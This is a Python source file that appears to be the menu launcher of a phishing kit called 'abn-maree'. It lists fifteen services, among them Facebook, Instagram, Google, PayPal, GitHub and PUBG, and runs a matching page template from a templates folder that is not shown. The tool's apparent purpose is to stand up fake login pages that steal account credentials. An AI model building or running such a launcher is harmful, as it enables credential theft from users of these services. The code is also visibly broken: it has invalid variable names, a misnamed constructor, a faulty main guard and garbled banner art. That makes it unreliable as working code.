# abn-maree
import os

class Gr:
    def StyleAndColors(self, text):
        # ### color ### #
        text = text.replace('W#', '\033[1;37m')
        text = text.replace('BL#', '\033[1;30m')
        text = text.replace('R#', '\033[1;31m')
        text = text.replace('G#', '\033[1;32m')
        text = text.replace('Y#', '\033[1;33m')
        text = text.replace('B#', '\033[1;34m')
        text = text.replace('P#', '\033[1;35m')
        text = text.replace('C#', '\033[1;36m')

        # ### style ### #
        text = text.replace(' [', '\033[1;33m [\033[1;37m')
        text = text.replace('] ', '\033[1;33m] ')
        text = text.replace('--', '\033[1;32m--')
        return text

    def list_main(self):
        style = '''
C# ___ _____ ___          _____ _        ___
B#(  ____ \\\\__   /(  __ \\|\\     /|\\__   /( (    /|(  __ \\
C#| (    \\/   ) (   | (    \\/| )   ( |   ) (   |  \\  ( || (    \\/
B#| (__       | |   | (_____ | (___) |   | |   |   \\ | || |
C#|  )      | |   (___  )|  _  |   | |   | (\\ \\) || | __
B#| (         | |         ) || (   ) |   | |   | | \\   || | \\_  )
C#| )      _) (_/\\____) || )   ( |___) (___| )  \\  || (___) |
B#|/       \\___

                   R# # ### Wabn mareeR# ### #
                          R# <C# 1.2 vR# >G#

╔-------------------------------------------------------------╗
|                                                             |
|  [01] - facebook     [06] - instafollowers   [11] - Reddit G# |
|  [02] - instagram    [07] - github           [12] - pubg   G# |
|  [03] - one.com      [08] - yahoo            [13] - clash  G# |
|  [04] - google       [09] - wordpress        [14] - pubg2  G# |
|  [05] - paypal       [10] - twitter          [15] - MyPage G# |
|                                                             |
╚-------------------------------------------------------------╝
'''
        return self.StyleAndColors(style)

class main(Gr):
	def init(self):
		os.system('clear')
		try:
			print (self.list_main())
			self.Functions()
		except KeyboardInterrupt:
			exit()

	def FunctionsRun(self,NameFunction):
		os.chdir('templates/%s'%NameFunction)
		os.system('python3 main')

	def Functions(self):
		user = input('\033[1;33m >   \033[1;37m').replace(' ','')
		print('')
		Abn maree = {
		1:'Fasebook',
		2:'Instagram',
		3:'One',
		4:'Google',
		5:'Paypal',
		6:'Instafollowers',
		7:'Github',
		8:'Yahoo',
		9:'Wordpress',
		10:'Twitter',
		11:'Reddit',
		12:'pubg',
		13:'Clash',
		14:'pubg2',
		15:'MyPage',
					}
		try:
			self.FunctionsRun(abn maree[int(user)])
		except :
			print('\033[1;31m[!] Not found [!]\n')
			self.Functions()

if name == '__main__':
	main()
